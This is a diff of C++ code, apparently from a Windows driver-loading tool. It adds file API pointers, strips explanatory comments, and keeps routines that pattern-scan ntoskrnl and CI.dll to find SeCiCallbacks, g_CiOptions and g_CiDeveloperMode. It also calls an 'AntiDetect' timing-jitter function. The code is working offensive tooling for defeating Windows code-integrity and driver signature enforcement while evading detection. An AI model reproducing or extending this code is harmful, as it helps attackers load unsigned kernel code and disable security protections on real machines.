@@ -14,6 +14,8 @@ pNtDeviceIoControlFile NtDeviceIoControlFilePtr = nullptr;
 pNtDeleteKey NtDeleteKeyPtr = nullptr;
 pNtOpenKey NtOpenKeyPtr = nullptr;
 pNtFlushKey NtFlushKeyPtr = nullptr;
+pNtCreateFile NtCreateFilePtr = nullptr;
+pNtSetInformationFile NtSetInformationFilePtr = nullptr;
 
 WCHAR g_LoaderServicePath[128] = { 0 };
 WCHAR g_DriverServicePath[128] = { 0 };
@@ -45,7 +47,7 @@ struct WindowsVersion {
 
 static WindowsVersion GetWindowsVersion() {
     WindowsVersion ver = { 0, 0, 0, false };
-    
+
     typedef NTSTATUS(WINAPI* RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
     HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
     if (ntdll) {
@@ -111,7 +113,7 @@ namespace KernelUtils {
                 mod.FullPathName + mod.OffsetToFileName
             );
 
-            // Print first few modules to help debug
+
             if (i < 5) {
                 printf("[*] Module[%lu]: %s @ %p\n", i, currentName, mod.ImageBase);
             }
@@ -125,13 +127,13 @@ namespace KernelUtils {
 
         VirtualFree(buffer, 0, MEM_RELEASE);
 
-        // Windows 11 25H2+ zeroes out ImageBase - use EnumDeviceDrivers fallback
+
         if (!result && _stricmp(moduleName, "ntoskrnl.exe") == 0) {
             printf("[*] ImageBase is NULL, trying EnumDeviceDrivers fallback...\n");
             LPVOID drivers[1024];
             DWORD cbNeeded = 0;
             if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded)) {
-                // First driver is typically ntoskrnl.exe
+
                 if (cbNeeded >= sizeof(LPVOID) && drivers[0] != nullptr) {
                     result = drivers[0];
                     printf("[+] EnumDeviceDrivers: ntoskrnl base @ %p\n", result);
@@ -178,7 +180,7 @@ namespace KernelUtils {
         AntiDetect::TimingJitter();
 
         WindowsVersion winVer = GetWindowsVersion();
-        printf("[*] Windows Version: %lu.%lu.%lu (%s)\n", 
+        printf("[*] Windows Version: %lu.%lu.%lu (%s)\n",
                winVer.major, winVer.minor, winVer.build,
                winVer.isWindows11 ? "Windows 11" : "Windows 10");
 
@@ -204,32 +206,30 @@ namespace KernelUtils {
         struct CiPattern {
             BYTE bytes[16];
             DWORD length;
-            DWORD leaOffset;     // Offset from pattern start to the LEA instruction
+            DWORD leaOffset;
             const char* name;
         };
 
-        // Original Windows 10 patterns (with 0xFF prefix from call instruction)
+
         CiPattern win10Patterns[] = {
-            // Pattern: call ?; mov rdx, rbx; lea r8, [rip+SeCiCallbacks]
-            // FF ?? 48 8B D3 4C 8D 05
+
+
             { { 0xFF, 0x48, 0x8B, 0xD3, 0x4C, 0x8D, 0x05 }, 7, 4, "Win10 call; mov rdx,rbx; lea r8" },
-            // Pattern: call ?; mov rcx, rbx; lea r8, [rip+SeCiCallbacks]
-            // FF ?? 48 8B CB 4C 8D 05
+
+
             { { 0xFF, 0x48, 0x8B, 0xCB, 0x4C, 0x8D, 0x05 }, 7, 4, "Win10 call; mov rcx,rbx; lea r8" },
         };
 
-        // Windows 11 25H2 pattern (from hex dump analysis)
-        // At 0x140784310: 41 B8 05 00 00 00 4C 8D 0D E5 03 78 00
-        // mov r8d, 5; lea r9, [rip+SeCiCallbacks]
+
         CiPattern win11Patterns[] = {
             { { 0x41, 0xB8, 0x05, 0x00, 0x00, 0x00, 0x4C, 0x8D, 0x0D }, 9, 6, "Win11 25H2 mov r8d,5; lea r9" },
         };
 
         CiPattern universalPatterns[] = {
-            // Fallback to original patterns without 0xFF prefix
+
             { { 0x48, 0x8B, 0xD3, 0x4C, 0x8D, 0x05 }, 6, 3, "Universal mov rdx,rbx; lea r8" },
             { { 0x48, 0x8B, 0xCB, 0x4C, 0x8D, 0x05 }, 6, 3, "Universal mov rcx,rbx; lea r8" },
-            // Generic lea r9 for fallback
+
             { { 0x4C, 0x8D, 0x0D }, 3, 0, "Universal lea r9" },
         };
 
@@ -254,7 +254,7 @@ namespace KernelUtils {
                         INT32 leaOff = *reinterpret_cast<INT32*>(leaAddr + 3);
                         ULONG_PTR targetAddr = reinterpret_cast<ULONG_PTR>(leaAddr) + 7 + static_cast<INT64>(leaOff);
                         ULONG_PTR targetOffset = targetAddr - reinterpret_cast<ULONG_PTR>(localModule);
-                        
+
                         if (targetOffset < modinfo.SizeOfImage) {
                             if (pat.length <= 3) {
                                 if (targetOffset > modinfo.SizeOfImage / 2) {
@@ -319,7 +319,7 @@ namespace KernelUtils {
         printf("[+] SeCiCallbacks offset from ntoskrnl base: 0x%llX\n", (unsigned long long)kernelOffset);
 
         if (kernelOffset >= modinfo.SizeOfImage) {
-            printf("[-] Invalid kernel offset (0x%llX >= 0x%lX)\n", 
+            printf("[-] Invalid kernel offset (0x%llX >= 0x%lX)\n",
                    (unsigned long long)kernelOffset, modinfo.SizeOfImage);
             FreeLibrary(localModule);
             return FALSE;
@@ -487,12 +487,7 @@ namespace KernelUtils {
         BYTE* base = reinterpret_cast<BYTE*>(localCi);
         PVOID optionsLocal = nullptr;
 
-        // Pattern from CiGetActionsForImage in CI.dll:
-        //   8B 05 ?? ?? ?? ??       mov  eax, cs:g_CiOptions
-        //   ... (within 20 bytes)
-        //   A8 08                   test al, 8
-        //   74 ??                   jz   short
-        //   F7 05 ?? ?? ?? ?? 00 04 00 00   test cs:g_CiTestFlags, 400h
+
         for (DWORD i = 0; i + 30 < modinfo.SizeOfImage; i++) {
             if (base[i] != 0x8B || base[i + 1] != 0x05) continue;
 
@@ -563,12 +558,7 @@ namespace KernelUtils {
         BYTE* base = reinterpret_cast<BYTE*>(localCi);
         PVOID devModeLocal = nullptr;
 
-        // Pattern from CiGetActionsForImage referencing g_CiDeveloperMode+2:
-        // F6 05 ?? ?? ?? ?? 01    test byte ptr [rip+g_CiDeveloperMode+2], 1
-        // 74 ??                   jz short
-        // 48 8B 45 08             mov rax, [rbp+8]
-        // 83 CB 10                or  ebx, 10h
-        // F7 40 30 00 01 00 00    test dword ptr [rax+30h], 100h
+
         for (DWORD i = 0; i + 23 < modinfo.SizeOfImage; i++) {
             if (base[i] == 0xF6 && base[i + 1] == 0x05 &&
                 base[i + 6] == 0x01 &&
@@ -584,7 +574,7 @@ namespace KernelUtils {
 
                 INT32 ripOffset = *reinterpret_cast<INT32*>(&base[i + 2]);
                 BYTE* target = &base[i + 7] + ripOffset;
-                target -= 2; // rip+offset points to g_CiDeveloperMode+2, subtract 2
+                target -= 2;
 
                 ULONG_PTR localOffset = reinterpret_cast<ULONG_PTR>(target) - reinterpret_cast<ULONG_PTR>(localCi);
                 if (localOffset < modinfo.SizeOfImage) {
